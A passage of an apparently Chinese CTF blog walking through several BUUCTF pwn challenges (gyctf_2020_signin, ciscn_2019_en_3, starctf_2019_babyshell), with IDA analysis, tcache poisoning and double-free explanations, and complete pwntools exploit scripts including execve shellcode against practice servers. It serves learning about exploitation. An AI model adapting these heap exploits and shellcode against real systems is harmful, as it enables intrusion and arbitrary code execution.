class="string">&#x27;1&#x27;</span>)                    </span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Please input size: \n&quot;</span>,<span class="built_in">str</span>(size))      </span><br><span class="line">    io.sendafter(<span class="string">&quot;Please input content: \n&quot;</span>,payload)         </span><br><span class="line">                                                             </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span>                                           </span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="string">&#x27;2&#x27;</span>)                    </span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Please input list index: \n&quot;</span>,<span class="built_in">str</span>(index)) </span><br><span class="line">                                                             </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_this</span>(<span class="params">index</span>):</span>                                       </span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="string">&#x27;3&#x27;</span>)                    </span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Please input list index: \n&quot;</span>,<span class="built_in">str</span>(index)) </span><br><span class="line"></span><br><span class="line">create(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x10</span>,p64(<span class="number">0x602010</span>) + p64(elf.symbols[<span class="string">&quot;system&quot;</span>]))<span class="comment">#0x602010是/bin/sh</span></span><br><span class="line">print_this(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="gyctf-2020-signin"><a href="#gyctf-2020-signin" class="headerlink" title="gyctf_2020_signin"></a>gyctf_2020_signin</h3><h4 id="0x00-基本信息-3"><a href="#0x00-基本信息-3" class="headerlink" title="0x00 基本信息"></a>0x00 基本信息</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/17.png" class=""><p>题目描述是在ubuntu18里面的，所以有tache机制</p><h4 id="0x01-IDA分析-3"><a href="#0x01-IDA分析-3" class="headerlink" title="0x01 IDA分析"></a>0x01 IDA分析</h4><h5 id="del函数"><a href="#del函数" class="headerlink" title="del函数"></a>del函数</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/18.png" class=""><p>虽然把flags清零了，但是ptrlist没有清零</p><h5 id="add函数-1"><a href="#add函数-1" class="headerlink" title="add函数"></a>add函数</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/19.png" class=""><p>只能分配0xF个chunk，有个ptrlist存在bss段上</p><h5 id="edit函数-1"><a href="#edit函数-1" class="headerlink" title="edit函数"></a>edit函数</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/20.png" class=""><p>cnt是一个全局变量，值为1，所以edit函数只能eait一次，一开始想劫持tache不过只能只能edit一次</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/21.jpg" class=""><h5 id="后门函数"><a href="#后门函数" class="headerlink" title="后门函数"></a>后门函数</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/22.png" class=""><p>calloc一下就判断ptr的值是否为0，不为0就起一个shell，ptr是bss段上的一个变量</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/23.jpg" class=""><h4 id="0x02解题思路"><a href="#0x02解题思路" class="headerlink" title="0x02解题思路"></a>0x02解题思路</h4><ol><li>分配8个chunk并free掉，会有一个chunk进入fastbin</li><li>add回来一个chunk</li><li>修改fastbin中的堆块的fd</li><li>执行后门函数</li></ol><h4 id="0x03-完整EXP-3"><a href="#0x03-完整EXP-3" class="headerlink" title="0x03 完整EXP"></a>0x03 完整EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;gyctf_2020_signin&#x27;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">binary = <span class="string">&#x27;gyctf_2020_signin&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;26743&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;your choice?&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;idx?&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;your choice?&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;idx?&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    <span class="comment"># io.recvuntil(&#x27;Content: &#x27;)</span></span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;your choice?&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;idx?&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>)</span><br><span class="line">payload = p64(<span class="number">0x4040C0</span> - <span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">7</span>,payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="0x04总结"><a href="#0x04总结" class="headerlink" title="0x04总结"></a>0x04总结</h4><h5 id="1-calloc分配堆块机制"><a href="#1-calloc分配堆块机制" class="headerlink" title="1.calloc分配堆块机制"></a>1.calloc分配堆块机制</h5><p>calloc分配堆块<strong>是不会从tache里面获取堆块的，在calloc的时候会从fastbin里面拿堆块，并且当它去取堆块的时候会把fastbin剩余的堆块放到tache里面</strong></p><p>实验一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *c1,*c2,*c3,*c4,*c5,*c6,*c7,*c8;</span><br><span class="line"><span class="keyword">void</span> *c9,*c10;</span><br><span class="line">c1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c2 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c3 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c4 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c5 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c6 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c7 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">c8 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c9 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c10 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(c1);</span><br><span class="line"><span class="built_in">free</span>(c2);</span><br><span class="line"><span class="built_in">free</span>(c3);</span><br><span class="line"><span class="built_in">free</span>(c4);</span><br><span class="line"><span class="built_in">free</span>(c5);</span><br><span class="line"><span class="built_in">free</span>(c6);</span><br><span class="line"><span class="built_in">free</span>(c7);</span><br><span class="line">    <span class="comment">//fastbin</span></span><br><span class="line"><span class="built_in">free</span>(c8);</span><br><span class="line"><span class="built_in">free</span>(c9);</span><br><span class="line"><span class="built_in">free</span>(c10);</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x20</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/24.png" class=""><p>在tache bin attack中也实验过了，malloc只有当tache中的bin分配完了之后才会把fastbin里面的堆块拿到tache里面，calloc不一样啊！！！</p><p>明白了这一点就很简单了直接<strong>tcache poisoning</strong>改到ptr-0x10的位置，之后触发后门函数就可以getshell了！</p><h3 id="ciscn-2019-en-3"><a href="#ciscn-2019-en-3" class="headerlink" title="ciscn_2019_en_3"></a>ciscn_2019_en_3</h3><h4 id="0x00-基本信息-4"><a href="#0x00-基本信息-4" class="headerlink" title="0x00 基本信息"></a>0x00 基本信息</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/25.png" class=""><p>保护全开不说，还多了一个FORTIFY，这是个啥？</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/26.png" class=""><p>就是说定义此宏会导致执行一些轻量级检查，以在使用各种字符串和内存操作函数（例如<code>memcpy</code>，<code>memset</code>、<code>stpcpy</code>、<code>strcpy</code>、<code>strncpy</code>、<code>strcat</code>、<code>strncat</code>、<code>sprintf</code>、<code>snprintf</code>、<code>vsprintf</code>、 <code>vsnprintf</code>、<code>gets</code>、 及其宽字符变体）时检测一些缓冲区溢出错误</p><p>比如printf就变成了printf_chk，它将可以检查格式化字符串漏洞的特殊字符，就像下面这样</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/27.png" class=""><h4 id="0x01-IDA分析-4"><a href="#0x01-IDA分析-4" class="headerlink" title="0x01 IDA分析"></a>0x01 IDA分析</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/28.jpg" class=""><p>在初始化的时候有两个地方可以泄露libc，一开始就瞄了一下没太在意，后面发现libc泄露不了没法写，看到wp才知道，写堆题还是要看看其他的输入点，每个输入点都有可能是一个漏洞点！</p><p>puts函数的输出是直到碰到”\x00”才会结束，s是一个大小为16的数组，它只让我们输入前八，所以我们把前八给写满如果后面没有”\x00”就会把后八的字符给带出来，后面碰巧是libc里面的地址</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/29.jpg" class=""><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/35.jpg" class=""><p>虽然%3$p会报错，但是%p不会报错调试一下，全是栈上的地址，随便找一个就行</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/33.png" class=""><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/34.jpg" class=""><p>下面就是正常的堆，show和edit函数废了</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/30.png" class=""><p>漏洞点就是在del里面，有个uaf</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/31.png" class=""><h4 id="0x02解题思路-1"><a href="#0x02解题思路-1" class="headerlink" title="0x02解题思路"></a>0x02解题思路</h4><ol><li>通过前面的溢出，泄露出libc</li><li>double free控制堆块修改fd指针指向free_hook</li><li>修改free_hook为system</li></ol><h4 id="0x03-完整EXP-4"><a href="#0x03-完整EXP-4" class="headerlink" title="0x03 完整EXP"></a>0x03 完整EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;ciscn_2019_en_3&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">binary = <span class="string">&#x27;ciscn_2019_en_3&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;25784&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">io = process(binary,env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>:<span class="string">&#x27;libc-2.27.so&#x27;</span>&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Input your choice:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Please input the size of story: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;please inpute the story: &#x27;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Input your choice:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Please input the index:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;name?\n&#x27;</span>,<span class="string">&#x27;zyen&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;ID.\n&#x27;</span>,<span class="string">&#x27;zyen1111&#x27;</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;setbuffer&#x27;</span>]-<span class="number">231</span></span><br><span class="line">io.success(<span class="string">&quot;[*]libc_base =&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">io.success(<span class="string">&quot;[*]system_addr =&gt; &quot;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line">io.success(<span class="string">&quot;[*]free_hook =&gt; &quot;</span> + <span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x20</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,p64(system_addr))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="0x04总结-1"><a href="#0x04总结-1" class="headerlink" title="0x04总结"></a>0x04总结</h4><h5 id="1-puts小实验"><a href="#1-puts小实验" class="headerlink" title="1.puts小实验"></a>1.puts小实验</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">16</span>];</span><br><span class="line">read(<span class="number">0</span>,s,<span class="number">16</span>);</span><br><span class="line"><span class="built_in">puts</span>(s);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面是read了8个字符，这次我们read了16个字符，但是我们的输入只输入了8个1，同样的，我们看到了它有泄露下面的地址，puts函数还是挺危险的！</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/37.png" class=""><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/36.jpg" class=""><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/38.png" class=""><p>最后啰嗦一下，此double free已经不适应用于libc-2.27了，libc-2.26不知道，double free的补丁已经打到libc-2.27上了，搞得我本地调试不了…（懒的换libc</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/32.jpg" class=""><p><a href="https://blog.csdn.net/easy_level1/article/details/115724038">libc补丁</a></p><p>加了个key，记得可以改这个key绕过这个检查的，但是这题没有edit函数….</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/39.jpg" class=""><h3 id="starctf-2019-babyshell"><a href="#starctf-2019-babyshell" class="headerlink" title="starctf_2019_babyshell"></a>starctf_2019_babyshell</h3><h4 id="0x00-基本信息-5"><a href="#0x00-基本信息-5" class="headerlink" title="0x00 基本信息"></a>0x00 基本信息</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/51.png" class=""><h4 id="0x01-IDA分析-5"><a href="#0x01-IDA分析-5" class="headerlink" title="0x01 IDA分析"></a>0x01 IDA分析</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/40.png" class=""><p>程序的流程很简单就是输入shllcode，然后执行，但是sub_400786里面还有名堂</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/41.png" class=""><p>它会对比一段字符串，如果匹配就能执行我们的shellcode，”\x00”就能绕过，问题不大</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/42.png" class=""><p>但当我把shellcode打进去的时候，很惊奇的发现居然没getshell，动调发现它居然把shellcode的push 42给占了</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/43.png" class=""><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/44.png" class=""><p>可能某个地方覆盖了吧也不太清楚，在shellcode前面加上几个”\x6a”就可以了</p><h4 id="0x02-完整EXP"><a href="#0x02-完整EXP" class="headerlink" title="0x02 完整EXP"></a>0x02 完整EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;starctf_2019_babyshell&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.27.so&#x27;)</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line">binary = <span class="string">&#x27;starctf_2019_babyshell&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;26094&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># check = &#x27;\x5A\x5A\x4A\x20\x6C\x6F\x76\x65\x73\x20\x73\x68\x65\x6C\x6C\x5F\x63\x6F\x64\x65\x2C\x61\x6E\x64\x20\x68\x65\x72\x65\x20\x69\x73\x20\x61\x20\x67\x69\x66\x74\x3A\x05\x20\x65\x6E\x6A\x6F\x79\x20\x69\x74\x21\x0A\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&#x27;\x6a\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05&#x27;</span></span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh())</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;give me shellcode, plz:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">&#x27;\x00\x6a&#x27;</span>+shellcode)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io.recv(10)</span></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h4><p>哇！哭了，学到了，直接编写shellcode调用sys_read</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./starctf_2019_babyshell&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x4008CB&#x27;)</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">shellcode = asm(<span 